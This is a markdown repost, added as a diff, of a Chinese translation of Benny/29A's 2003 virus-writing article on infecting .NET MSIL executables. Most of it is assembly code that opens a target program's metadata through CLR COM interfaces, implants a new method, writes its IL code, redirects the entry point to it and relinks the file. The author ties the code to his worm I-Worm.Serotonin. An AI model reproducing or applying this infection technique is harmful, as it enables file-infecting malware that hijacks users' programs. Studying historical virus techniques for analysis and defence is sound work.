@@ -1,0 +1,241 @@
+
+
+# MSIL-PE-EXE 感染策略
+
+> 原文：[`www.pediy.com/kssd/pediy12/106762.html`](https://www.pediy.com/kssd/pediy12/106762.html)
+
+MSIL-PE-EXE 感染策略  
+排版有点乱,感兴趣的朋友还是看附件里面的 word 文档吧.  
+翻译 by littlewisp  2010-02-06  
+不妥之处，敬请指出。  
+http://vxheavens.com/lib/vbe00.html  
+在我的上一篇关于.NET 平台的文章“Microsoft .NET Common Language Runtime Overview”中，我介绍了.NET 平台 Beta2 给我们提供的技术。演示了一个用 C#写的针对.NET 程序的感染者(叫做”Donut” by Averz)。发布 Beta2 不久之后微软发布了新的 Visual Studio .NET 版本。从发布 Beta2 那时起基本上没改变，该版本跟 Beta2 版本差别不大。但我有更多的时间，文挡和知识来探索该环境。  
+  
+当我编写 I-Worm.Serotonin 的时候，我想比 Donut 更深入一步。Donut 能以某些特殊的方式用自己的东西替换 CLR 头和元数据，但没有有效的方式来返回来执行宿主程序。我确信必定有方法来编写.NET 程序真正的感染者。时间一天天过去，下一步在等待。不替换但通过添加新的病毒数据来感染元数据，来保证它们激活后返回宿主程序。这意味着分析元数据的结构并且找到一种新的方法来给当前代码来植入新的成员，不会在用户的屏幕上带来任何的 bug 和可疑的行为。  
+  
+当我分析 CLR 文档的时候我发现该环境有非常丰富的接口来与 CLR 交互，并且非常透明，它可以在托管程序内部访问，也可以在外部访问(对于本地程序来说)。通过工具和帮助，程序不必直接访问元数据。他们只需要调用正确的环境函数。编译器，链接器，调试器不需要知道内部结构，一切由系统托管。  
+注意：包含 COR.INC 用来帮助应对 CLR 和元数据，可以在 29A#7 中找到。你可以在 MSVS\_NET\_PATH\\FrameworkSDK\\Tool Developers guide\\docs 路径里找到详细的文挡。  
+我以前说过，CLR 环境提供了一些 COM 接口，基础的接口（文中讨论的）如下：  
+  
+用来打开元数据的：  
+  IMetaDataDispenser  
+  IMetaDataDispenserEx  
+用来修改元数据（和清单）的：  
+  IMetaDataEmit  
+  IMetaDataAssemblyEmit  
+用来分析元数据（和清单）的：  
+  IMetaDataImport  
+  IMetaDataAssemblyImport  
+  
+我将以最简单的任务开始。让我们打开存储在磁盘上的原数据。首先我们要初始化 COM,然后创建”Dispenser”对象，该对象会给我们提供需要的接口。代码如下：  
+  
+  push  0      ;reserved, must be 0  
+  call  CoInitialize  
+  push  offset ppv    ;pointer to returned interface  
+  call  @over\_iid  
+  IID\_IMetaDataDispenserEx  ;required interface identifier  
+@over\_iid:  
+  push  1      ;CLSCTX\_INPROC\_SERVER  
+  push  0      ;not part of an agregate  
+  call  @over\_clsid  
+  CLSID\_CorMetaDataDispenser  ;object identifier  
+@over\_clsid:  
+  call  CoCreateInstance  
+  
+现在我们有了 ImetaDataDispenserEx 接口的指针，我们可以调用它的方法：  
+  DefineScope  
+  OpenScope  
+  OpenScopeOnMemory  
+  
+最有趣的方法是是 OpenScope，它允许优雅的访问磁盘上可执行文件。该方法返回一个接口。（(IMetaDataEmit, IMetaDataImport, IMetaDataAssemblyEmit or IMetaDataAssemblyImport），通过接口我们可以访问元数据成员。  
+  push  offset pEmit    ;pointer to returned interface  
+  call  @over\_iid2  
+  IID\_IMetaDataEmit    ;requested interface identifier  
+@over\_iid2:  
+  push  0      ;open for read (1 for write)  
+  call  @over\_wsz    ;filename in unicode  
+  dw  'c',':','\\','p','r','o','g','.','e','x','e',0  
+@over\_wsz:  
+  mov  eax,\[ppv\]    ;EAX = pointer to Dispenser object  
+  push  eax      ;"this" calling convention  
+  mov  eax,\[eax\]  
+  call  \[eax.IMetaDataDispenser\_OpenScope\]  
+  
+现在我们来做一些更难的事情在元数据里声明新的全局的方法"void METHOD\_IMPLANTED()"  
+  push  offset mdToken    ;returned method token  
+  push  0      ;implementation flags  
+  push  0      ;RVA of method IL code (can be set l8er by SetRVA method)  
+  push  3      ;number of bytes in signature  
+  call  @over\_sig  
+  db  IMAGE\_CEE\_CS\_CALLCONV\_HASTHIS,0,ELEMENT\_TYPE\_VOID  
+@over\_sig:        ;method signature (in/out arguments)  
+  push  mdPrivate or mdStatic  ;method attributes  
+  call  @over\_wsz2  
+  dw  'M','E','T','H','O','D','\_','I','M','P','L','A','N','T','E','D',0  
+@over\_wsz2:        ;method name  
+  push  0      ;0 = global method  
+  mov  eax,\[pEmit\]    ;EAX = pointer to Emitter  
+  push  eax  
+  mov  eax,\[eax\]  
+  call  \[eax.IMetaDataEmit\_DefineMethod\]  
+  
+相同的我们也可以调用其它的 Emitter 方法，当一切完成之后，不要忘记了在内存中释放所有的对象。  
+  mov  eax,\[pEmit\]  
+  push  eax  
+  mov  eax,\[eax\]  
+  call  \[eax.IUnknown\_Release\]  
+  
+  mov  eax,\[ppv\]  
+  push  eax  
+  mov  eax,\[eax\]  
+  call  \[eax.IUnknown\_Release\]  
+  
+我不会更详细的介绍了，所有的方法（由编译器来产生元数据使用的）有非常好的文档。最好看一下其它有非常有用但是没有被文挡化的东西连接器的接口。你可能知道元数据本身并足够来执行程序。元数据知识描述了程序的对象布局。全功能的程序必须被连接为 PE 文件，其中不止存储元数据还有 MSIL 代码可以存储在任何可读的区段中。所以，我们必须用新的元数据重新编译和重新连接。  
+我唯一能找到的文件头文档存储在 MSVS\_NET\_Path\\FrameworkSDK\\Include\\ICeeFileGen.h 文件中，该文件描述了 IceeFileGen 类和该类的所有公共方法。在这里也描述两个 API, CreateICeeFileGen and DestroyICeeFileGen。源码帮助我们理解它是一个对象的描述，该对象用来执行生成文件，但是我们在哪里能找到代码呢？  
+观察.NET 框架的核心文件夹（.NET Framework core (%windir%\\Microsoft.NET\\Framework\\v1.0.3705\\) 注意 mscorpe.dll。这是我们要找的宝贵财富。检查它导出的 API 你会发现和 ICeeFileGen.h 文件描述的正好相符。  
+好，我们继续：  
+  @pushsz  'mscorpe'    ;name of DLL  
+  call  LoadLibraryA    ;load it  
+  xchg  eax,ebx      ;address in EBX  
+  
+  @pushsz  'DestroyICeeFileGen'  
+  push  ebx  
+  call  GetProcAddress  
+  xchg  eax,esi      ;address of DestroyICeeFileGen API in ESI  
+  
+  @pushsz  'CreateICeeFileGen'  
+  push  ebx  
+  call  GetProcAddress    ;address of CreateICeeFileGen API in EAX  
+  
+  push  offset ICeeFileGen  ;pointer to interface variable  
+  call  eax      ;create object interface  
+  
+  mov  edi,\[ICeeFileGen\]  ;pointer to interface in EDI  
+  mov  edi,\[edi\]    ;interface in EDI  
+  
+  push  offset file\_handle  
+  call  \[edi.ICeeFileGen\_CreateCeeFile\]  
+          ;object initialization  
+  
+  
+  
+  call  @over\_outwsz  
+  dw  'c',':','\\','o','u','t','p','u','t','.','e','x','e',0  
+@over\_outwsz:  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_SetOutputFileName\]  
+          ;set output file to "c:\\output.exe"  
+  
+  ;we also have to write new IL code to our file. we will reserve a place in PE  
+  ;file (so called "section") and copy there our data. everything is done in  
+  ;memory, all datas are flushed on disk at final stage.  
+  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_LinkCeeFile\]  
+          ;before we will start to work with addresses  
+          ;we have to re-link program in memory  
+  
+  push  offset il\_section  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_GetIlSection\]  
+          ;request section for IL code  
+  
+  push  offset il\_section\_rva  
+  push  \[il\_section\]  
+  call  \[edi.ICeeFileGen\_GetSectionRVA\]  
+          ;we have to know RVA of section  
+  
+  push  offset raw\_il\_section  
+  push  1  
+  push  4  
+  push  \[il\_section\]  
+  call  \[edi.ICeeFileGen\_GetSectionBlock\]  
+          ;allocate 4 bytes. we won't use them, it is  
+          ;only a trick to get offset in section  
+  
+  push  offset il\_section\_offset  
+  push  \[raw\_il\_section\]  
+  push  \[il\_section\]  
+  call  \[edi.ICeeFileGen\_ComputeSectionOffset\]  
+          ;now we know offset in our section  
+  
+  
+  ;we will set RVA of our new method  
+  
+  mov  eax,offset il\_section\_rva  
+  push  eax      ;EAX = section address  
+  add  \[eax\],12345678h    ;EAX += offset in section  
+il\_section\_offset = dword ptr $-4  
+  add  dword ptr \[eax\],4  ;EAX += 4 (we have to skip first allocated bytes)  
+  push  dword ptr \[eax\]  
+  push  \[mdToken\]  
+  mov  eax,\[pEmit\]  
+  push  eax  
+  mov  eax,\[eax\]  
+  call  \[eax.IMetaDataEmit\_SetRVA\]  
+  
+  
+  ;we will reserve next place for our code, immediately following our 4 bytez  
+  
+  push  offset raw\_il\_section  
+  push  1  
+  push  IL\_code\_size  
+  push  \[il\_section\]  
+  call  \[edi.ICeeFileGen\_GetSectionBlock\]  
+  
+  pushad  
+  mov  esi,offset IL\_code  ;address of IL code of our new method  
+  mov  edi,12345678h    ;target memory address  
+raw\_il\_section = dword ptr $-4  
+  mov  ecx,IL\_code\_size  ;size of IL code  
+  rep  movsb      ;copy IL code to file  
+  popad  
+  
+  
+  
+  ...        ;other stuff defining parameters of linking  
+  
+  
+  
+  push  \[mdToken\]  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_SetEntryPoint\]  
+          ;set entrypoint to our new method  
+  
+  push  \[pEmit\]  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_EmitMetaDataEx\]  
+          ;write metadata to file  
+  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_LinkCeeFile\]  
+          ;re-link PE file in memory  
+  
+  push  \[file\_handle\]  
+  call  \[edi.ICeeFileGen\_GenerateCeeFile\]  
+          ;write PE file to disk  
+  
+  
+  
+  push  offset file\_handle  
+  call  \[edi.ICeeFileGen\_DestroyCeeFile\]  
+          ;unitialize object  
+  push  offset ICeeFileGen  
+  call  esi      ;release object from memory  
+  
+  push  ebx  
+  call  FreeLibrary    ;release library from memory  
+  
+就到这里吧。你可以看出，非常简单而且有效。如果你想看在这基础之上的真正的工作的代码，请看我的 I-Worm.Serotonin.。这里提到的所有的和更多更多的东西可以在里面发现。  
+.NET CLR 环境非常易被病毒深入，它提供了一种假设，作者不关心实现方面的东西。该环境中还有我许多没有描述的功能。一切皆有可能。我确信可以在.net 上使用我们在 Win32 世界中所了解的病毒的技术和策略。这只取决于我们在.NET 恶意代码上所花费的耐心和时间。  
+  
+  ..............................  
+  .  
+  .  Jan 25 2003  Benny/29A  
+  .    benny@post.cz  
+  .  
+  ... searching for perfection ...
+
+上传的附件
+| ![](img/b7e61e3627e1e92d7b948dd8fdd24fa6.jpg) || MSIL-PE-EXE 感染策略.doc  
+ |
